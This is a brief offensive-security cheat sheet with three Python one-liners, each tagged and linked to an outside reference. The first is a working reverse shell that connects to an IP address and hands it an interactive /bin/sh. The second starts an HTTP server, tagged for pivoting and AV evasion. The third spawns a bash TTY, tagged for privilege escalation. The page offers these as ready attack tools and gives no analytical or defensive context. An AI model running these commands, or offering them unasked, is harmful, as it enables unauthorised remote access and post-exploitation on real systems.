### 1. python reverse shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
**- linux,reverse shells,Windows,python**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 2. instant web server
```
python -m SimpleHTTPServer [PORT]
```
**- pivoting,interesting,python,av evasion**
#### References:

https://docs.python.org/2/library/simplehttpserver.html
__________
### 3. python spawn bash
```
python -c 'import pty;pty.spawn("/bin/bash")'
```
**- python,shell,privilege escalation**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
